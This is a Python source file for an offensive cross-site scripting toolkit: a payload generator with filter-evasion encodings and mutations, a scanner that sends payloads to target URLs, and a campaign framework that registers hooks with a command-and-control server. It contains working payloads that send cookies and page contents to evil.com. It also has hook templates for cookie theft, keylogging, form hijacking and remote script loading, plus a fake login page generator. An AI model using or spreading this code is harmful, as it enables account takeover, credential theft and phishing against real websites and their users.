import re
import json
import base64
import random
import string
import hashlib
from typing import Dict, List, Optional, Any
from urllib.parse import quote, urlencode
from dataclasses import dataclass, field
from enum import Enum

class XSSContext(Enum):
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    JAVASCRIPT = "javascript"
    CSS = "css"
    URL = "url"
    IFRAME = "iframe"
    EVENT_HANDLER = "event_handler"

class XSSVectorType(Enum):
    REFLECTED = "reflected"
    STORED = "stored"
    DOM_BASED = "dom_based"
    BLIND = "blind"
    MUTATION = "mutation"

@dataclass
class XSSPayload:
    vector: str
    context: XSSContext
    type: XSSVectorType
    tags: List[str] = field(default_factory=list)
    encoding: str = "none"
    bypass_waf: bool = False
    description: str = ""

@dataclass
class XSSTarget:
    url: str
    parameter: str
    method: str = "GET"
    headers: Dict = field(default_factory=dict)
    cookies: Dict = field(default_factory=dict)
    context: XSSContext = XSSContext.HTML_BODY
    filters: List[str] = field(default_factory=list)

class XSSPayloadGenerator:
    BASE_PAYLOADS = {
        XSSContext.HTML_BODY: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<video><source onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
        ],
        XSSContext.HTML_ATTRIBUTE: [
            "\" onmouseover=alert(1) \"",
            "' onmouseover=alert(1) '",
            "\" autofocus onfocus=alert(1) \"",
            "' autofocus onfocus=alert(1) '",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
        ],
        XSSContext.JAVASCRIPT: [
            "';alert(1);//",
            "\";alert(1);//",
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "`${alert(1)}`",
            "</script><script>alert(1)</script>",
        ],
        XSSContext.CSS: [
            "expression(alert(1))",
            "url(javascript:alert(1))",
            "@import'javascript:alert(1)'",
            "behavior:url(javascript:alert(1))",
        ],
        XSSContext.EVENT_HANDLER: [
            "onload=alert(1)",
            "onerror=alert(1)",
            "onmouseover=alert(1)",
            "onfocus=alert(1)",
            "onclick=alert(1)",
            "oninput=alert(1)",
        ]
    }

    WAF_BYPASS_PAYLOADS = {
        XSSContext.HTML_BODY: [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script >alert(1)</script >",
            "<script/>alert(1)",
            "<img src=x onerror=alert(1)//",
            "<svg/onload=alert(1)>",
            "<math><maction actiontype=\"statusline#\"><mtext>x</mtext></maction></math>",
            "<details open ontoggle=alert(1)>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        ],
        XSSContext.HTML_ATTRIBUTE: [
            "\" onmouseover=alert(1) x=\"",
            "' onmouseover=alert(1) x='",
            "\" autofocus/onfocus=alert(1) \"",
            "javascript:alert(1)//",
            "data:text/html,<script>alert(1)</script>",
        ],
        XSSContext.JAVASCRIPT: [
            "';alert(1);//",
            "';eval(atob('YWxlcnQoMSk='))//",
            "';Function('alert(1)')()//",
            "\";alert(1);//",
            "`-alert(1)-`",
        ]
    }

    ADVANCED_PAYLOADS = [
        XSSPayload(
            vector="<svg/onload=fetch('//evil.com/?c='+document.cookie)>",
            context=XSSContext.HTML_BODY,
            type=XSSVectorType.REFLECTED,
            tags=["exfiltration", "cookie"],
            description="Cookie exfiltration via SVG onload"
        ),
        XSSPayload(
            vector="<img src=x onerror=fetch('//evil.com/?k='+btoa(document.body.innerHTML))>",
            context=XSSContext.HTML_BODY,
            type=XSSVectorType.STORED,
            tags=["exfiltration", "dom"],
            description="DOM exfiltration"
        ),
        XSSPayload(
            vector="<script>new Image().src='//evil.com/?c='+encodeURIComponent(document.cookie)</script>",
            context=XSSContext.HTML_BODY,
            type=XSSVectorType.REFLECTED,
            tags=["exfiltration", "cookie"],
            description="Cookie theft with encoding"
        ),
        XSSPayload(
            vector="<form id=x><input name=value></form><script>document.x.submit()</script>",
            context=XSSContext.HTML_BODY,
            type=XSSVectorType.REFLECTED,
            tags=["csrf", "form"],
            description="Auto-submit form for CSRF"
        ),
        XSSPayload(
            vector="<iframe src=javascript:setInterval(()=>{try{top.postMessage({c:document.cookie},'*')}catch(e){}},1000)>",
            context=XSSContext.IFRAME,
            type=XSSVectorType.DOM_BASED,
            tags=["iframe", "postmessage", "cookie"],
            description="Cross-origin cookie theft via postMessage"
        ),
        XSSPayload(
            vector="<svg onload=navigator.sendBeacon('//evil.com/',document.cookie)>",
            context=XSSContext.HTML_BODY,
            type=XSSVectorType.REFLECTED,
            tags=["exfiltration", "beacon", "cookie"],
            description="Cookie exfiltration via sendBeacon"
        ),
        XSSPayload(
            vector="<input autofocus onfocus=alert(1)>",
            context=XSSContext.HTML_ATTRIBUTE,
            type=XSSVectorType.REFLECTED,
            tags=["autofocus", "bypass"],
            description="Autofocus bypass for no-interaction XSS"
        ),
        XSSPayload(
            vector="'${alert(1)}'",
            context=XSSContext.JAVASCRIPT,
            type=XSSVectorType.DOM_BASED,
            tags=["template", "es6"],
            description="Template literal injection"
        ),
    ]

    ENCODERS = {
        'html': lambda s: ''.join(f'&#x{ord(c):x};' for c in s),
        'html_decimal': lambda s: ''.join(f'&#{ord(c)};' for c in s),
        'url': lambda s: quote(s, safe=''),
        'unicode': lambda s: ''.join(f'\\u{ord(c):04x}' for c in s),
        'hex': lambda s: ''.join(f'%{ord(c):02x}' for c in s),
        'base64': lambda s: base64.b64encode(s.encode()).decode(),
        'double_url': lambda s: quote(quote(s, safe=''), safe=''),
        'mixed': lambda s: ''.join(
            f'&#x{ord(c):x};' if random.random() > 0.5 else f'&#{ord(c)};' for c in s
        ),
    }

    def __init__(self):
        self.custom_payloads: List[XSSPayload] = []

    def generate(self, context: XSSContext, waf_bypass: bool = False, count: int = 10) -> List[XSSPayload]:
        payloads = []
        base = self.WAF_BYPASS_PAYLOADS.get(context, []) if waf_bypass else self.BASE_PAYLOADS.get(context, [])
        
        for vec in base[:count]:
            payloads.append(XSSPayload(
                vector=vec,
                context=context,
                type=XSSVectorType.REFLECTED,
                tags=["basic"],
                bypass_waf=waf_bypass
            ))
        
        advanced = [p for p in self.ADVANCED_PAYLOADS if p.context == context]
        payloads.extend(advanced[:max(0, count - len(payloads))])
        
        custom = [p for p in self.custom_payloads if p.context == context]
        payloads.extend(custom[:max(0, count - len(payloads))])
        
        return payloads[:count]

    def encode_payload(self, payload: str, encoding: str) -> str:
        encoder = self.ENCODERS.get(encoding)
        if encoder:
            return encoder(payload)
        return payload

    def mutate_payload(self, payload: str, mutations: int = 3) -> List[str]:
        results = [payload]
        for _ in range(mutations):
            mutated = payload
            if random.random() > 0.5:
                mutated = self._case_randomize(mutated)
            if random.random() > 0.5:
                mutated = self._insert_comments(mutated)
            if random.random() > 0.5:
                mutated = self._encode_chars(mutated)
            if random.random() > 0.5:
                mutated = self._add_junk(mutated)
            results.append(mutated)
        return list(set(results))

    def _case_randomize(self, s: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    def _insert_comments(self, s: str) -> str:
        return s.replace('<', '<!-- --><').replace('>', '><!-- -->>')

    def _encode_chars(self, s: str) -> str:
        result = []
        for c in s:
            if random.random() > 0.7 and c.isalnum():
                result.append(f'&#x{ord(c):x};')
            else:
                result.append(c)
        return ''.join(result)

    def _add_junk(self, s: str) -> str:
        junk = ''.join(random.choices(string.ascii_letters, k=random.randint(1, 4)))
        return s.replace('script', f'scr{ junk }ipt').replace('alert', f'al{ junk }ert')

    def add_custom_payload(self, payload: XSSPayload):
        self.custom_payloads.append(payload)

    def build_polyglot(self, contexts: List[XSSContext]) -> str:
        parts = []
        for ctx in contexts:
            payloads = self.generate(ctx, waf_bypass=True, count=1)
            if payloads:
                parts.append(payloads[0].vector)
        return ''.join(parts)

class XSSScanner:
    def __init__(self, generator: XSSPayloadGenerator):
        self.generator = generator
        self.session = requests.Session()
        self.results: List[Dict] = []

    def scan_target(self, target: XSSTarget, payloads: List[XSSPayload]) -> List[Dict]:
        findings = []
        for payload in payloads:
            try:
                result = self._test_payload(target, payload)
                if result['vulnerable']:
                    findings.append(result)
            except Exception as e:
                pass
        return findings

    def _test_payload(self, target: XSSTarget, payload: XSSPayload) -> Dict:
        test_url = target.url
        test_data = {}
        headers = target.headers.copy()
        
        if target.method == "GET":
            params = {target.parameter: payload.vector}
            test_url = f"{target.url}?{urlencode(params)}"
        else:
            test_data[target.parameter] = payload.vector
            headers['Content-Type'] = 'application/x-www-form-urlencoded'

        try:
            resp = self.session.request(
                method=target.method,
                url=test_url,
                data=test_data if test_data else None,
                headers=headers,
                cookies=target.cookies,
                timeout=10,
                allow_redirects=True
            )
            
            reflected = self._check_reflection(resp.text, payload.vector)
            executed = self._check_execution(resp.text, payload.vector)
            
            return {
                'vulnerable': reflected or executed,
                'url': test_url,
                'parameter': target.parameter,
                'payload': payload.vector,
                'context': payload.context.value,
                'type': payload.type.value,
                'reflected': reflected,
                'executed': executed,
                'status_code': resp.status_code,
                'response_length': len(resp.text),
                'headers': dict(resp.headers)
            }
        except Exception as e:
            return {
                'vulnerable': False,
                'error': str(e),
                'payload': payload.vector
            }

    def _check_reflection(self, response: str, payload: str) -> bool:
        return payload in response

    def _check_execution(self, response: str, payload: str) -> bool:
        execution_indicators = [
            'alert(1)', 'prompt(1)', 'confirm(1)', 'onerror=', 'onload=',
            'onmouseover=', 'onfocus=', 'javascript:', 'eval(', 'Function('
        ]
        payload_lower = payload.lower()
        response_lower = response.lower()
        for indicator in execution_indicators:
            if indicator in payload_lower and indicator in response_lower:
                return True
        return False

    def scan_url(self, url: str, params: List[str] = None) -> List[Dict]:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        existing_params = parse_qs(parsed.query)
        test_params = params or list(existing_params.keys()) or ['q', 'search', 'query', 'id', 'name', 'input', 'data']
        
        all_findings = []
        for param in test_params:
            target = XSSTarget(
                url=parsed.scheme + '://' + parsed.netloc + parsed.path,
                parameter=param,
                method="GET" if parsed.query else "POST"
            )
            payloads = self.generator.generate(XSSContext.HTML_BODY, waf_bypass=True, count=20)
            findings = self.scan_target(target, payloads)
            all_findings.extend(findings)
        return all_findings

class XSSExploitFramework:
    def __init__(self, c2_url: str = "http://localhost:8080"):
        self.c2_url = c2_url
        self.generator = XSSPayloadGenerator()
        self.scanner = XSSScanner(self.generator)
        self.active_campaigns: Dict[str, Dict] = {}
        self.hooks: Dict[str, Dict] = {}

    def create_campaign(self, name: str, targets: List[XSSTarget], payload_types: List[str] = None) -> str:
        campaign_id = hashlib.md5(f"{name}{time.time()}".encode()).hexdigest()[:12]
        self.active_campaigns[campaign_id] = {
            'name': name,
            'targets': targets,
            'payload_types': payload_types or ['reflected', 'stored', 'dom'],
            'created': datetime.now().isoformat(),
            'status': 'pending',
            'results': []
        }
        return campaign_id

    def execute_campaign(self, campaign_id: str) -> Dict:
        campaign = self.active_campaigns.get(campaign_id)
        if not campaign:
            return {'error': 'Campaign not found'}
        
        campaign['status'] = 'running'
        all_results = []
        
        for target in campaign['targets']:
            contexts = [XSSContext.HTML_BODY, XSSContext.HTML_ATTRIBUTE, XSSContext.JAVASCRIPT]
            for ctx in contexts:
                payloads = self.generator.generate(ctx, waf_bypass=True, count=15)
                results = self.scanner.scan_target(target, payloads)
                for r in results:
                    r['target_url'] = target.url
                    r['campaign_id'] = campaign_id
                    all_results.append(r)
                    if r['vulnerable']:
                        self._deploy_hook(r)
        
        campaign['results'] = all_results
        campaign['status'] = 'completed'
        campaign['completed'] = datetime.now().isoformat()
        return campaign

    def _deploy_hook(self, finding: Dict):
        hook_id = hashlib.md5(f"{finding['url']}{finding['payload']}{time.time()}".encode()).hexdigest()[:12]
        hook_payload = self._build_hook_payload(finding)
        self.hooks[hook_id] = {
            'id': hook_id,
            'finding': finding,
            'payload': hook_payload,
            'deployed': datetime.now().isoformat(),
            'checkins': []
        }
        self._send_hook_to_c2(hook_id, hook_payload)

    def _build_hook_payload(self, finding: Dict) -> str:
        hook_url = f"{self.c2_url}/hook/{hashlib.md5(finding['url'].encode()).hexdigest()[:8]}"
        payload_templates = {
            'cookie_steal': f"<script>new Image().src='{hook_url}?c='+encodeURIComponent(document.cookie)</script>",
            'keylogger': f"""<script>
document.onkeypress=function(e){{fetch('{hook_url}?k='+encodeURIComponent(e.key))}}
</script>""",
            'form_jack': f"""<script>
document.querySelectorAll('form').forEach(f=>f.addEventListener('submit',e=>{{
fetch('{hook_url}?d='+encodeURIComponent(new URLSearchParams(new FormData(f)).toString()))
}}))
</script>""",
            'dom_exfil': f"""<script>
fetch('{hook_url}?dom='+encodeURIComponent(document.documentElement.outerHTML))
</script>""",
            'beef_hook': f"<script src='{hook_url}/hook.js'></script>",
        }
        return payload_templates.get('cookie_steal', payload_templates['cookie_steal'])

    def _send_hook_to_c2(self, hook_id: str, payload: str):
        try:
            requests.post(f"{self.c2_url}/api/xss/register_hook", json={
                'hook_id': hook_id,
                'payload': payload
            }, timeout=5)
        except Exception:
            pass

    def get_hook_checkins(self, hook_id: str) -> List[Dict]:
        return self.hooks.get(hook_id, {}).get('checkins', [])

    def generate_phishing_page(self, target_url: str, payload: str, template: str = "login") -> str:
        templates = {
            "login": f"""<!DOCTYPE html>
<html><head><title>Sign In</title>
<style>body{{font-family:Arial,sans-serif;max-width:400px;margin:50px auto;padding:20px}}
input{{width:100%;padding:10px;margin:5px 0;box-sizing:border-box}}
button{{width:100%;padding:10px;background:#007bff;color:#fff;border:none;cursor:pointer}}</style>
</head><body>
<h2>Account Login</h2>
<form action="{target_url}" method="POST">
<input type="hidden" name="redirect" value="{target_url}">
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
{payload}
</body></html>""",
            "generic": f"""<!DOCTYPE html>
<html><head><title>Loading...</title></head><body>
<h3>Please wait...</h3>
{payload}
</body></html>""",
            "pdf": f"""<!DOCTYPE html>
<html><head><title>Document Preview</title></head><body>
<iframe src="{target_url}" width="100%" height="600px"></iframe>
{payload}
</body></html>""",
        }
        return templates.get(template, templates['generic'])

    def export_campaign(self, campaign_id: str, format: str = "json") -> str:
        campaign = self.active_campaigns.get(campaign_id)
        if not campaign:
            return "Campaign not found"
        
        if format == "json":
            return json.dumps(campaign, indent=2, default=str)
        elif format == "csv":
            import csv
            from io import StringIO
            output = StringIO()
            writer = csv.writer(output)
            writer.writerow(['URL', 'Parameter', 'Payload', 'Context', 'Type', 'Vulnerable', 'Reflected', 'Executed'])
            for r in campaign['results']:
                writer.writerow([
                    r.get('target_url', ''),
                    r.get('parameter', ''),
                    r.get('payload', '')[:100],
                    r.get('context', ''),
                    r.get('type', ''),
                    r.get('vulnerable', False),
                    r.get('reflected', False),
                    r.get('executed', False)
                ])
            return output.getvalue()
        return str(campaign)

import requests
from datetime import datetime
import time